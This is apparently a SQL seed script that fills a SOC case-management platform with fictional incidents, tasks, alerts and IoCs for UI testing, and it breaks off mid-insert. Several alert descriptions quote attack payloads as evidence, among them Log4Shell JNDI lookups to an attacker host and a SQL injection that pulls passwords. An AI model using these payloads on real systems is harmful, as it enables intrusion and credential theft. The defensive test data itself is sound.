-- =============================================================================
-- Realistic SOC Test Data Seed
-- Purpose: Populate the platform with realistic investigation data for UI/UX testing.
-- Usage:  psql -h localhost -U thehive -d thehive -f seed/001_realistic_soc_data.sql
-- Note:   This seed is idempotent — uses ON CONFLICT to skip duplicates.
--         All UUIDs are fixed for reproducibility. Timestamps are in 2026.
-- =============================================================================

BEGIN;

-- ---------------------------------------------------------------------------
-- 1. Organisations
-- ---------------------------------------------------------------------------
INSERT INTO organisations (id, name, description, created_at, updated_at) VALUES
  ('a0000000-0000-0000-0000-000000000001', 'NCS', 'NCS Fusion Center — primary SOC operator', '2026-01-15T08:00:00Z', '2026-01-15T08:00:00Z'),
  ('a0000000-0000-0000-0000-000000000002', 'PVO', 'PVO Corporation — external partner/client', '2026-01-20T10:00:00Z', '2026-01-20T10:00:00Z'),
  ('a0000000-0000-0000-0000-000000000003', 'Bank-SOC', 'Finance division SOC — restricted access', '2026-02-01T09:00:00Z', '2026-02-01T09:00:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 2. Profiles
-- ---------------------------------------------------------------------------
INSERT INTO profiles (id, name, permissions, created_at, updated_at) VALUES
  ('b0000000-0000-0000-0000-000000000001', 'superadmin',
    ARRAY['managePlatform','manageCase','manageAlert','manageObservable','manageTask','manageUser','manageOrganisation','manageProfile','manageTag','manageCustomField','manageTemplate','managePage','manageDashboard','manageNotification','manageTaxonomy','managePattern','manageConfig','manageAction'],
    '2026-01-15T08:00:00Z', '2026-01-15T08:00:00Z'),
  ('b0000000-0000-0000-0000-000000000002', 'analyst',
    ARRAY['manageCase','manageAlert','manageObservable','manageTask','manageTag'],
    '2026-01-15T08:00:00Z', '2026-01-15T08:00:00Z'),
  ('b0000000-0000-0000-0000-000000000003', 'read-only',
    ARRAY['manageCase'],
    '2026-01-15T08:00:00Z', '2026-01-15T08:00:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 3. Users
-- ---------------------------------------------------------------------------
INSERT INTO users (id, login, name, organisation_id, profile_id, status, created_at, updated_at) VALUES
  ('c0000000-0000-0000-0000-000000000001', 'admin@thehive.local', 'Admin User',
    'a0000000-0000-0000-0000-000000000001', 'b0000000-0000-0000-0000-000000000001', 'Ok',
    '2026-01-15T08:00:00Z', '2026-01-15T08:00:00Z'),
  ('c0000000-0000-0000-0000-000000000002', 'nghia.dinh@ncsgroup.vn', 'Nghia Dinh',
    'a0000000-0000-0000-0000-000000000001', 'b0000000-0000-0000-0000-000000000001', 'Ok',
    '2026-01-16T09:00:00Z', '2026-01-16T09:00:00Z'),
  ('c0000000-0000-0000-0000-000000000003', 'dat.tran@pvo.com.vn', 'Dat Tran',
    'a0000000-0000-0000-0000-000000000002', 'b0000000-0000-0000-0000-000000000002', 'Ok',
    '2026-01-16T09:30:00Z', '2026-01-16T09:30:00Z'),
  ('c0000000-0000-0000-0000-000000000004', 'analyst.soc@ncsgroup.vn', 'SOC Analyst',
    'a0000000-0000-0000-0000-000000000001', 'b0000000-0000-0000-0000-000000000002', 'Ok',
    '2026-02-01T10:00:00Z', '2026-02-01T10:00:00Z'),
  ('c0000000-0000-0000-0000-000000000005', 'client.bank@bank.com', 'Dave Pham',
    'a0000000-0000-0000-0000-000000000003', 'b0000000-0000-0000-0000-000000000003', 'Ok',
    '2026-02-10T11:00:00Z', '2026-02-10T11:00:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 4. Cases — realistic SOC investigations
-- ---------------------------------------------------------------------------
INSERT INTO cases (id, legacy_id, number, title, description, severity, tlp, pap, status, owner, assignee, tags, flag, summary, impact_status, resolution_status, case_template, owning_organisation, organisation_ids, start_date, end_date, created_at, updated_at) VALUES

  -- Case 1: Ransomware incident — Open, high severity
  ('d0000000-0000-0000-0000-000000000001', 'legacy-case-001', 1,
   '[INC-0001] Ransomware Incident — Finance Dept Workstation',
   'Multiple finance department workstations encrypted by LockBit 3.0 variant. Initial infection vector suspected via phishing email with macro-enabled Excel attachment. Lateral movement detected to file server FS-FIN-01.',
   3, 3, 3, 'Open', 'nghia.dinh@ncsgroup.vn', 'nghia.dinh@ncsgroup.vn',
   ARRAY['ransomware','lockbit','phishing','finance','critical'],
   true, '', 'WithImpact', '', '', 'NCS',
   ARRAY['NCS'],
   '2026-04-28T14:30:00Z', NULL,
   '2026-04-28T14:30:00Z', '2026-05-01T09:15:00Z'),

  -- Case 2: BEC attempt — Resolved
  ('d0000000-0000-0000-0000-000000000002', 'legacy-case-002', 2,
   '[INC-0002] Business Email Compromise — CEO Impersonation',
   'CFO received email from spoofed CEO address requesting urgent wire transfer of $45,000 to offshore account. Email headers show SPF/DKIM failure. No funds transferred — CFO verified via phone call.',
   2, 2, 2, 'Resolved', 'dat.tran@pvo.com.vn', 'dat.tran@pvo.com.vn',
   ARRAY['bec','email-fraud','spoofing','social-engineering'],
   false, 'Attempted BEC blocked by employee awareness. No financial loss. Sender domain reported to registrar.',
   'NoImpact', 'Duplicated', '', 'NCS',
   ARRAY['NCS'],
   '2026-04-15T10:00:00Z', '2026-04-16T16:45:00Z',
   '2026-04-15T10:00:00Z', '2026-04-16T16:45:00Z'),

  -- Case 3: Phishing campaign — Open, medium severity
  ('d0000000-0000-0000-0000-000000000003', 'legacy-case-003', 3,
   '[INC-0003] Credential Harvesting Phishing Campaign',
   'Wave of phishing emails targeting HR department with fake SharePoint login pages. 3 employees reported clicking link. Credential harvesting kit hosted on compromised WordPress site. IoCs shared with PVO partner.',
   2, 2, 2, 'Open', 'nghia.dinh@ncsgroup.vn', 'dat.tran@pvo.com.vn',
   ARRAY['phishing','credential-theft','sharepoint','hr-department'],
   true, '', 'NoImpact', '', '', 'NCS',
   ARRAY['NCS','PVO'],
   '2026-05-01T08:00:00Z', NULL,
   '2026-05-01T08:00:00Z', '2026-05-03T11:20:00Z'),

  -- Case 4: Insider threat — Open, high severity
  ('d0000000-0000-0000-0000-000000000004', 'legacy-case-004', 4,
   '[INC-0004] Insider Threat — Data Exfiltration via USB',
   'DLP alert triggered: employee in R&D department copied 2.3 GB of proprietary source code to personal USB device. HR and Legal notified. Employee access restricted pending investigation.',
   3, 4, 3, 'Open', 'nghia.dinh@ncsgroup.vn', 'nghia.dinh@ncsgroup.vn',
   ARRAY['insider-threat','data-exfiltration','dlp','usb','rd-department'],
   true, '', 'WithImpact', '', '', 'NCS',
   ARRAY['NCS','Bank-SOC'],
   '2026-05-02T16:00:00Z', NULL,
   '2026-05-02T16:00:00Z', '2026-05-04T10:30:00Z'),

  -- Case 5: DDoS attack — Resolved
  ('d0000000-0000-0000-0000-000000000005', 'legacy-case-005', 5,
   '[INC-0005] DDoS Attack — Customer Portal',
   'Volumetric DDoS attack targeting customer-facing portal (portal.example.com). Peak traffic 45 Gbps. Mitigated via CDN rate limiting and upstream blackhole routing. Attack lasted 3 hours.',
   2, 2, 2, 'Resolved', 'dat.tran@pvo.com.vn', 'dat.tran@pvo.com.vn',
   ARRAY['ddos','volumetric','customer-portal','cdn'],
   false, 'DDoS mitigated via CDN. Attack source traced to botnet. No data breach. Portal restored within 3 hours.',
   'NoImpact', 'Indeterminate', '', 'NCS',
   ARRAY['NCS'],
   '2026-04-20T22:00:00Z', '2026-04-21T08:00:00Z',
   '2026-04-20T22:00:00Z', '2026-04-21T08:00:00Z'),

  -- Case 6: Vulnerability exploitation — Open, critical
  ('d0000000-0000-0000-0000-000000000006', 'legacy-case-006', 6,
   '[INC-0006] Log4Shell Exploitation — Internet-Facing Server',
   'IDS detected Log4Shell (CVE-2021-44228) exploitation attempt against internet-facing Java application server APP-PROD-03. Payload: ${jndi:ldap://attacker.example.com:1389/a}. Server patched but forensic image taken.',
   4, 3, 4, 'Open', 'nghia.dinh@ncsgroup.vn', 'nghia.dinh@ncsgroup.vn',
   ARRAY['log4shell','cve-2021-44228','exploitation','java','internet-facing'],
   true, '', 'WithImpact', '', '', 'NCS',
   ARRAY['NCS'],
   '2026-05-03T03:15:00Z', NULL,
   '2026-05-03T03:15:00Z', '2026-05-03T07:00:00Z'),

  -- Case 7: Malware analysis — Open, low severity
  ('d0000000-0000-0000-0000-000000000007', 'legacy-case-007', 7,
   '[INC-0007] Suspicious PowerShell Execution — SOC Lab',
   'EDR alert on SOC lab workstation: encoded PowerShell command downloading payload from pastebin. Investigating whether this is authorized red team activity or compromise.',
   1, 1, 1, 'Open', 'dat.tran@pvo.com.vn', 'dat.tran@pvo.com.vn',
   ARRAY['powershell','edr','suspicious','lab-environment'],
   false, '', 'NoImpact', '', '', 'NCS',
   ARRAY['NCS'],
   '2026-05-04T11:00:00Z', NULL,
   '2026-05-04T11:00:00Z', '2026-05-04T11:00:00Z'),

  -- Case 8: PVO escalated — Open, medium
  ('d0000000-0000-0000-0000-000000000008', 'legacy-case-008', 8,
   '[INC-0008] Brute Force Attack — VPN Gateway',
   'PVO detected sustained brute force attack against VPN gateway. 15,000+ failed login attempts from Eastern European IP ranges. Account lockout policy triggered. No successful compromise detected.',
   2, 2, 2, 'Open', 'analyst.soc@ncsgroup.vn', 'analyst.soc@ncsgroup.vn',
   ARRAY['brute-force','vpn','pvo','lockout','eastern-europe'],
   false, '', 'NoImpact', '', '', 'PVO',
   ARRAY['PVO','NCS'],
   '2026-05-04T15:30:00Z', NULL,
   '2026-05-04T15:30:00Z', '2026-05-04T15:30:00Z'),

  -- Case 9: Duplicate of case 2
  ('d0000000-0000-0000-0000-000000000009', 'legacy-case-009', 9,
   '[INC-0009] BEC Attempt — CFO Wire Transfer Request',
   'Duplicate of case #2. Same BEC campaign targeting CFO with wire transfer request.',
   2, 2, 2, 'Duplicated', 'dat.tran@pvo.com.vn', 'dat.tran@pvo.com.vn',
   ARRAY['bec','duplicate'],
   false, 'Duplicate of case #2.', 'NoImpact', '', '',
   'NCS', ARRAY['NCS'],
   '2026-04-16T09:00:00Z', '2026-04-16T09:30:00Z',
   '2026-04-16T09:00:00Z', '2026-04-16T09:30:00Z'),

  -- Case 10: Advanced Persistent Threat (APT) — Open, critical
  ('d0000000-0000-0000-0000-000000000010', 'legacy-case-010', 10,
   '[INC-0010] APT Attack Detection — PVO IIS Web Server',
   'PVO internal SOC detected a webshell installed on their public facing IIS server. The webshell communicates via port 443 with an unknown IP. High priority response needed from NCS to assist PVO.',
   4, 3, 4, 'Open', 'dat.tran@pvo.com.vn', 'nghia.dinh@ncsgroup.vn',
   ARRAY['apt','webshell','iis','incident-response'],
   true, '', 'WithImpact', '', '', 'PVO',
   ARRAY['PVO','NCS'],
   '2026-05-06T10:00:00Z', NULL,
   '2026-05-06T10:00:00Z', '2026-05-06T10:30:00Z')
ON CONFLICT (id) DO NOTHING;

-- Link case 9 as duplicate of case 2
UPDATE cases SET merged_into = 'd0000000-0000-0000-0000-000000000002' WHERE id = 'd0000000-0000-0000-0000-000000000009';
UPDATE cases SET merged_from = ARRAY['d0000000-0000-0000-0000-000000000009'] WHERE id = 'd0000000-0000-0000-0000-000000000002';

-- ---------------------------------------------------------------------------
-- 5. Case Shares
-- ---------------------------------------------------------------------------
INSERT INTO case_shares (id, case_id, organisation, profile, owner, task_action_required, created_at, updated_at) VALUES
  ('e0000000-0000-0000-0000-000000000001', 'd0000000-0000-0000-0000-000000000001', 'NCS', 'analyst', true, false, '2026-04-28T14:30:00Z', '2026-04-28T14:30:00Z'),
  ('e0000000-0000-0000-0000-000000000002', 'd0000000-0000-0000-0000-000000000001', 'PVO', 'analyst', false, true, '2026-04-29T08:00:00Z', '2026-04-29T08:00:00Z'),
  ('e0000000-0000-0000-0000-000000000003', 'd0000000-0000-0000-0000-000000000003', 'NCS', 'analyst', true, false, '2026-05-01T08:00:00Z', '2026-05-01T08:00:00Z'),
  ('e0000000-0000-0000-0000-000000000004', 'd0000000-0000-0000-0000-000000000003', 'PVO', 'analyst', false, false, '2026-05-01T09:00:00Z', '2026-05-01T09:00:00Z'),
  ('e0000000-0000-0000-0000-000000000005', 'd0000000-0000-0000-0000-000000000004', 'NCS', 'analyst', true, false, '2026-05-02T16:00:00Z', '2026-05-02T16:00:00Z'),
  ('e0000000-0000-0000-0000-000000000006', 'd0000000-0000-0000-0000-000000000004', 'Bank-SOC', 'read-only', false, false, '2026-05-03T09:00:00Z', '2026-05-03T09:00:00Z'),
  ('e0000000-0000-0000-0000-000000000007', 'd0000000-0000-0000-0000-000000000008', 'PVO', 'analyst', true, false, '2026-05-04T15:30:00Z', '2026-05-04T15:30:00Z'),
  ('e0000000-0000-0000-0000-000000000008', 'd0000000-0000-0000-0000-000000000008', 'NCS', 'analyst', false, true, '2026-05-04T16:00:00Z', '2026-05-04T16:00:00Z'),
  ('e0000000-0000-0000-0000-000000000009', 'd0000000-0000-0000-0000-000000000010', 'PVO', 'analyst', true, false, '2026-05-06T10:00:00Z', '2026-05-06T10:00:00Z'),
  ('e0000000-0000-0000-0000-000000000010', 'd0000000-0000-0000-0000-000000000010', 'NCS', 'analyst', false, true, '2026-05-06T10:00:00Z', '2026-05-06T10:00:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 6. Tasks — realistic investigation tasks
-- ---------------------------------------------------------------------------
INSERT INTO task_items (id, case_id, title, status, assignee, group_name, order_index, flag, description, start_date, end_date, due_date, organisation_ids, created_at, updated_at) VALUES

  -- Case 1 tasks: Ransomware
  ('f0000000-0000-0000-0000-000000000001', 'd0000000-0000-0000-0000-000000000001',
   'Isolate affected workstations from network', 'Completed', 'nghia.dinh@ncsgroup.vn',
   'Containment', 0, true, 'Disconnect FIN-WS-01, FIN-WS-02, FIN-WS-03 from network. Preserve volatile memory before shutdown.',
   '2026-04-28T15:00:00Z', '2026-04-28T16:30:00Z', '2026-04-28T18:00:00Z',
   ARRAY['NCS'], '2026-04-28T14:30:00Z', '2026-04-28T16:30:00Z'),

  ('f0000000-0000-0000-0000-000000000002', 'd0000000-0000-0000-0000-000000000001',
   'Collect forensic images from affected systems', 'InProgress', 'dat.tran@pvo.com.vn',
   'Evidence Collection', 0, true, 'Create forensic disk images of FIN-WS-01, FIN-WS-02, FIN-WS-03, and FS-FIN-01. Use FTK Imager. Document chain of custody.',
   '2026-04-29T09:00:00Z', NULL, '2026-04-30T18:00:00Z',
   ARRAY['NCS'], '2026-04-28T14:30:00Z', '2026-04-29T09:00:00Z'),

  ('f0000000-0000-0000-0000-000000000003', 'd0000000-0000-0000-0000-000000000001',
   'Analyze phishing email headers and payload', 'Completed', 'nghia.dinh@ncsgroup.vn',
   'Analysis', 0, false, 'Extract IOCs from phishing email: sender IP, domain, attachment hash, C2 URLs.',
   '2026-04-28T15:30:00Z', '2026-04-29T11:00:00Z', '2026-04-29T18:00:00Z',
   ARRAY['NCS'], '2026-04-28T14:30:00Z', '2026-04-29T11:00:00Z'),

  ('f0000000-0000-0000-0000-000000000004', 'd0000000-0000-0000-0000-000000000001',
   'Check backup integrity and prepare restoration plan', 'Waiting', 'nghia.dinh@ncsgroup.vn',
   'Recovery', 0, false, 'Verify last known good backup for FS-FIN-01. Test restoration in isolated environment.',
   NULL, NULL, '2026-05-05T18:00:00Z',
   ARRAY['NCS'], '2026-04-28T14:30:00Z', '2026-04-28T14:30:00Z'),

  ('f0000000-0000-0000-0000-000000000005', 'd0000000-0000-0000-0000-000000000001',
   'Notify affected stakeholders and prepare incident report', 'Waiting', 'nghia.dinh@ncsgroup.vn',
   'Communication', 0, false, 'Draft incident report for CISO. Notify legal team. Prepare customer communication if data breach confirmed.',
   NULL, NULL, '2026-05-06T18:00:00Z',
   ARRAY['NCS'], '2026-04-28T14:30:00Z', '2026-04-28T14:30:00Z'),

  -- Case 3 tasks: Phishing campaign
  ('f0000000-0000-0000-0000-000000000006', 'd0000000-0000-0000-0000-000000000003',
   'Reset credentials for 3 affected employees', 'InProgress', 'dat.tran@pvo.com.vn',
   'Remediation', 0, true, 'Force password reset for HR employees who clicked phishing link. Enable MFA if not already active.',
   '2026-05-01T10:00:00Z', NULL, '2026-05-01T18:00:00Z',
   ARRAY['NCS'], '2026-05-01T08:00:00Z', '2026-05-01T10:00:00Z'),

  ('f0000000-0000-0000-0000-000000000007', 'd0000000-0000-0000-0000-000000000003',
   'Block phishing domains at DNS/proxy level', 'Completed', 'dat.tran@pvo.com.vn',
   'Containment', 0, false, 'Add phishing domains to DNS sinkhole and proxy blocklist. Submit URLs to threat intel feeds.',
   '2026-05-01T08:30:00Z', '2026-05-01T09:30:00Z', '2026-05-01T12:00:00Z',
   ARRAY['NCS'], '2026-05-01T08:00:00Z', '2026-05-01T09:30:00Z'),

  ('f0000000-0000-0000-0000-000000000008', 'd0000000-0000-0000-0000-000000000003',
   'Analyze phishing kit on compromised WordPress site', 'Waiting', 'nghia.dinh@ncsgroup.vn',
   'Analysis', 0, false, 'Download and analyze phishing kit. Extract C2 infrastructure. Report to hosting provider for takedown.',
   NULL, NULL, '2026-05-03T18:00:00Z',
   ARRAY['NCS'], '2026-05-01T08:00:00Z', '2026-05-01T08:00:00Z'),

  -- Case 4 tasks: Insider threat
  ('f0000000-0000-0000-0000-000000000009', 'd0000000-0000-0000-0000-000000000004',
   'Review DLP logs for data exfiltration scope', 'InProgress', 'nghia.dinh@ncsgroup.vn',
   'Investigation', 0, true, 'Analyze DLP logs to determine full scope of data exfiltration. Identify all files copied to USB.',
   '2026-05-02T16:30:00Z', NULL, '2026-05-05T18:00:00Z',
   ARRAY['NCS'], '2026-05-02T16:00:00Z', '2026-05-02T16:30:00Z'),

  ('f0000000-0000-0000-0000-000000000010', 'd0000000-0000-0000-0000-000000000004',
   'Coordinate with HR and Legal for employee interview', 'Waiting', 'nghia.dinh@ncsgroup.vn',
   'HR/Legal', 0, false, 'Schedule meeting with HR and Legal to discuss employee interview strategy. Prepare evidence summary.',
   NULL, NULL, '2026-05-06T18:00:00Z',
   ARRAY['NCS'], '2026-05-02T16:00:00Z', '2026-05-02T16:00:00Z'),

  -- Case 6 tasks: Log4Shell
  ('f0000000-0000-0000-0000-000000000011', 'd0000000-0000-0000-0000-000000000006',
   'Verify APP-PROD-03 is patched against Log4Shell', 'Completed', 'nghia.dinh@ncsgroup.vn',
   'Remediation', 0, true, 'Confirm Log4j version >= 2.17.0. Verify JVM flag -Dlog4j2.formatMsgNoLookups=true is set.',
   '2026-05-03T04:00:00Z', '2026-05-03T05:30:00Z', '2026-05-03T12:00:00Z',
   ARRAY['NCS'], '2026-05-03T03:15:00Z', '2026-05-03T05:30:00Z'),

  ('f0000000-0000-0000-0000-000000000012', 'd0000000-0000-0000-0000-000000000006',
   'Analyze forensic image for post-exploitation artifacts', 'InProgress', 'dat.tran@pvo.com.vn',
   'Forensics', 0, true, 'Mount forensic image. Search for reverse shells, webshells, persistence mechanisms, lateral movement indicators.',
   '2026-05-03T08:00:00Z', NULL, '2026-05-05T18:00:00Z',
   ARRAY['NCS'], '2026-05-03T03:15:00Z', '2026-05-03T08:00:00Z'),

  -- Case 8 tasks: Brute force
  ('f0000000-0000-0000-0000-000000000013', 'd0000000-0000-0000-0000-000000000008',
   'Block attacking IP ranges at firewall', 'Completed', 'analyst.soc@ncsgroup.vn',
   'Containment', 0, false, 'Add Eastern European IP ranges to firewall deny list. Enable geo-blocking for VPN gateway.',
   '2026-05-04T16:00:00Z', '2026-05-04T17:00:00Z', '2026-05-04T20:00:00Z',
   ARRAY['PVO'], '2026-05-04T15:30:00Z', '2026-05-04T17:00:00Z'),

  ('f0000000-0000-0000-0000-000000000014', 'd0000000-0000-0000-0000-000000000008',
   'Review VPN logs for any successful compromises', 'Waiting', 'analyst.soc@ncsgroup.vn',
   'Investigation', 0, false, 'Audit VPN authentication logs for the attack window. Check for any successful logins from suspicious IPs.',
   NULL, NULL, '2026-05-06T18:00:00Z',
   ARRAY['PVO'], '2026-05-04T15:30:00Z', '2026-05-04T15:30:00Z'),
   
  -- Case 10 tasks: APT
  ('f0000000-0000-0000-0000-000000000015', 'd0000000-0000-0000-0000-000000000010',
   'Yêu cầu PVO cô lập máy chủ Web Server bị nhiễm webshell', 'Completed', 'dat.tran@pvo.com.vn',
   'Containment', 0, true, 'Ngắt kết nối mạng máy chủ IIS ra khỏi internal network nhưng vẫn giữ nguồn để capture memory.',
   '2026-05-06T10:15:00Z', '2026-05-06T10:30:00Z', '2026-05-06T11:00:00Z',
   ARRAY['PVO','NCS'], '2026-05-06T10:00:00Z', '2026-05-06T10:30:00Z'),
   
  ('f0000000-0000-0000-0000-000000000016', 'd0000000-0000-0000-0000-000000000010',
   'Reverse engineering mã độc webshell thu thập được', 'InProgress', 'nghia.dinh@ncsgroup.vn',
   'Analysis', 0, false, 'SOC NCS tiến hành tải file webshell về phân tích tĩnh và động để tìm C2.',
   '2026-05-06T10:30:00Z', NULL, '2026-05-07T18:00:00Z',
   ARRAY['NCS'], '2026-05-06T10:30:00Z', '2026-05-06T10:30:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 7. Alerts — realistic SOC alert queue
-- ---------------------------------------------------------------------------
INSERT INTO alerts (id, legacy_id, title, type, source, source_ref, severity, tlp, pap, status, read, follow, flag, description, external_link, last_sync_date, organisation_id, case_id, case_template, tags, occurred_at, created_at, updated_at) VALUES

  ('10000000-0000-0000-0000-000000000001', 'legacy-alert-001',
   'LockBit 3.0 Ransomware Detected — FIN-WS-01',
   'ransomware', 'EDR-CrowdStrike', 'CS-2026-04-001',
   3, 3, 3, 'Imported', true, true, true,
   'CrowdStrike EDR detected LockBit 3.0 ransomware execution on FIN-WS-01. Process: svchost.exe (injected). Encrypted files: 847 files in C:\\Users\\finance\\. Registry persistence created.',
   'https://falcon.crowdstrike.com/incidents/CS-2026-04-001',
   '2026-04-28T14:25:00Z', 'NCS',
   'd0000000-0000-0000-0000-000000000001', '',
   ARRAY['ransomware','lockbit','edr','crowdstrike','critical'],
   '2026-04-28T14:20:00Z', '2026-04-28T14:25:00Z', '2026-04-28T14:30:00Z'),

  ('10000000-0000-0000-0000-000000000002', 'legacy-alert-002',
   'Suspicious Email — CEO Wire Transfer Request',
   'phishing', 'Email-Gateway', 'EG-2026-04-002',
   2, 2, 2, 'Imported', true, true, false,
   'Email gateway flagged inbound email with spoofed CEO display name. SPF: fail, DKIM: fail, DMARC: fail. Attachment: none. Link: wire transfer form hosted on compromised site.',
   '',
   '2026-04-15T09:55:00Z', 'NCS',
   'd0000000-0000-0000-0000-000000000002', '',
   ARRAY['phishing','bec','email-gateway','spoofing'],
   '2026-04-15T09:50:00Z', '2026-04-15T09:55:00Z', '2026-04-15T10:00:00Z'),

  ('10000000-0000-0000-0000-000000000003', 'legacy-alert-003',
   'SharePoint Phishing — Credential Harvest',
   'phishing', 'Email-Gateway', 'EG-2026-05-003',
   2, 2, 2, 'New', false, true, true,
   'Multiple HR employees received phishing emails with fake SharePoint login page. URL: hxxps://sharepoint-login[.]example[.]com/auth. Hosting: compromised WordPress site.',
   '',
   '2026-05-01T07:55:00Z', 'NCS',
   NULL, '',
   ARRAY['phishing','credential-theft','sharepoint','hr'],
   '2026-05-01T07:50:00Z', '2026-05-01T07:55:00Z', '2026-05-01T07:55:00Z'),

  ('10000000-0000-0000-0000-000000000004', 'legacy-alert-004',
   'DLP Alert — USB Data Exfiltration',
   'dlp', 'DLP-Symantec', 'DLP-2026-05-004',
   3, 4, 3, 'Imported', true, true, true,
   'DLP policy violation: employee john.doe@company.com copied 2.3 GB to USB device KINGSTON DT100G3. Files: source code repository, design documents, customer database export.',
   '',
   '2026-05-02T15:55:00Z', 'NCS',
   'd0000000-0000-0000-0000-000000000004', '',
   ARRAY['dlp','insider-threat','usb','data-exfiltration'],
   '2026-05-02T15:50:00Z', '2026-05-02T15:55:00Z', '2026-05-02T16:00:00Z'),

  ('10000000-0000-0000-0000-000000000005', 'legacy-alert-005',
   'IDS Alert — Log4Shell Exploitation Attempt',
   'exploitation', 'IDS-Suricata', 'IDS-2026-05-005',
   4, 3, 4, 'Imported', true, true, true,
   'Suricata IDS alert: ET EXPLOIT Apache Log4j RCE Attempt (CVE-2021-44228). Destination: APP-PROD-03 (10.0.1.50:8080). Payload: ${jndi:ldap://185.220.101.34:1389/a}.',
   '',
   '2026-05-03T03:10:00Z', 'NCS',
   'd0000000-0000-0000-0000-000000000006', '',
   ARRAY['log4shell','cve-2021-44228','exploitation','ids','suricata'],
   '2026-05-03T03:05:00Z', '2026-05-03T03:10:00Z', '2026-05-03T03:15:00Z'),

  ('10000000-0000-0000-0000-000000000006', 'legacy-alert-006',
   'EDR Alert — Suspicious PowerShell Execution',
   'malware', 'EDR-CrowdStrike', 'CS-2026-05-006',
   1, 1, 1, 'New', false, true, false,
   'CrowdStrike detected encoded PowerShell command on SOC-LAB-WS-02. Command: powershell -enc <base64>. Downloads payload from hxxps://pastebin[.]com/raw/abc123.',
   '',
   '2026-05-04T10:55:00Z', 'NCS',
   NULL, '',
   ARRAY['powershell','edr','suspicious','lab'],
   '2026-05-04T10:50:00Z', '2026-05-04T10:55:00Z', '2026-05-04T10:55:00Z'),

  ('10000000-0000-0000-0000-000000000007', 'legacy-alert-007',
   'VPN Brute Force Attack Detected',
   'brute-force', 'SIEM-Splunk', 'SPL-2026-05-007',
   2, 2, 2, 'Imported', true, true, false,
   'Splunk correlation rule triggered: 15,000+ failed VPN login attempts from IP ranges 185.220.0.0/16 and 91.219.0.0/16 in 2-hour window. Account lockout policy engaged.',
   '',
   '2026-05-04T15:25:00Z', 'PVO',
   'd0000000-0000-0000-0000-000000000008', '',
   ARRAY['brute-force','vpn','splunk','siem','lockout'],
   '2026-05-04T15:20:00Z', '2026-05-04T15:25:00Z', '2026-05-04T15:30:00Z'),

  ('10000000-0000-0000-0000-000000000008', 'legacy-alert-008',
   'Suspicious DNS Query — DGA Domain',
   'network', 'DNS-Monitor', 'DNS-2026-05-008',
   2, 2, 2, 'New', false, true, true,
   'DNS monitor detected high-entropy domain query from workstation HR-WS-05: xkq7m9p2v4j8[.]top. Pattern matches known DGA (Domain Generation Algorithm) behavior.',
   '',
   '2026-05-05T08:30:00Z', 'NCS',
   NULL, '',
   ARRAY['dns','dga','network','suspicious'],
   '2026-05-05T08:25:00Z', '2026-05-05T08:30:00Z', '2026-05-05T08:30:00Z'),

  ('10000000-0000-0000-0000-000000000009', 'legacy-alert-009',
   'WAF Alert — SQL Injection Attempt',
   'web-attack', 'WAF-Cloudflare', 'WAF-2026-05-009',
   2, 2, 2, 'New', false, true, false,
   'Cloudflare WAF blocked SQL injection attempt against customer portal API endpoint /api/v2/orders. Payload: UNION SELECT username,password FROM users--.',
   '',
   '2026-05-05T09:15:00Z', 'NCS',
   NULL, '',
   ARRAY['sql-injection','waf','web-attack','api'],
   '2026-05-05T09:10:00Z', '2026-05-05T09:15:00Z', '2026-05-05T09:15:00Z'),

  ('10000000-0000-0000-0000-000000000010', 'legacy-alert-010',
   'Malware Sample — Emotet Dropper',
   'malware', 'Sandbox-ANY.RUN', 'ANY-2026-05-010',
   3, 2, 2, 'New', false, true, true,
   'ANY.RUN sandbox analysis: Emotet dropper detected. Hash: a1b2c3d4e5f6... C2: 194.5.249.132:443. Persistence: scheduled task. Exfiltration: SMTP to compromised mail servers.',
   'https://any.run/tasks/a1b2c3d4e5f6',
   '2026-05-05T10:00:00Z', 'NCS',
   NULL, '',
   ARRAY['emotet','malware','dropper','c2','sandbox'],
   '2026-05-05T09:55:00Z', '2026-05-05T10:00:00Z', '2026-05-05T10:00:00Z')
ON CONFLICT (id) DO NOTHING;

-- ---------------------------------------------------------------------------
-- 8. Observables — IOCs and evidence
-- ---------------------------------------------------------------------------
INSERT INTO observables (id, legacy_id, case_id, data_type, data, message, tlp, ioc, sighted, ignore_similarity, tags, created_by, created_at, updated_at) VALUES

  -- Case 1 observables: Ransomware
  ('20000000-0000-0000-0000-000000000001', 'legacy-obs-001',
   'd0000000-0000-0000-0000-000000000001',
   'ip', '185.220.101.34', 'C2 server IP from LockBit ransomware',
   3, true, true, false, ARRAY['c2','lockbit','ransomware'], 'nghia.dinh@ncsgroup.vn',
   '2026-04-28T15:00:00Z', '2026-04-28T15:00:00Z'),

  ('20000000-0000-0000-0000-000000000002', 'legacy-obs-002',
   'd0000000-0000-0000-0000-000000000001',
   'domain', 'lockbit3[.]onion', 'LockBit 3.0 leak site',
   3, true, true, false, ARRAY['lockbit','onion','leak-site'], 'nghia.dinh@ncsgroup.vn',
   '2026-04-28T15:05:00Z', '2026-04-28T15:05:00Z'),

  ('20000000-0000-0000-0000-000000000003', 'legacy-obs-003',
   'd0000000-0000-0000-0000-000000000001',
   'hash_sha256', 'a1b2c3d4e5f6789012345678901234567890abcdef1234567890abcdef123456',
   'LockBit 3.0 payload hash',
   3, true, true, false, ARRAY['ransomware','lockbit','payload'], 'nghia.dinh@ncsgroup.vn',
   '2026-04-28T15:10:00Z', '2026-04-28T15:10:00Z'),

  ('20000000-0000-0000-0000-000000000004', 'legacy-obs-004',
   'd0000000-0000-0000-0000-000000000001',
   'email', 'ceo@company-spoofed.com', 'Phishing sender email address',
   2, true, true, false, ARRAY['phishing','email','spoofed'], 'nghia.dinh@ncsgroup.vn',
   '2026-04-28T15:15:00Z', '2026-04-28T15:15:00Z'),

  -- Case 3 observables: Phishing
  ('20000000-0000-0000-0000-000000000005', 'legacy-obs-005',
   'd0000000-0000-0000-0000-000000000003',
   'url', 'hxxps://sharepoint-login[.]example[.]com/auth', 'Phishing credential harvesting page',
   2, true, true, false, ARRAY['phishing','credential-theft','url'], 'dat.tran@pvo.com.vn',
   '2026-05-01T08:15:00Z', '2026-05-01T08:15:00Z'),

  ('20000000-0000-0000-0000-000000000006', 'legacy-obs-006',
   'd0000000-0000-0000-0000-000000000003',
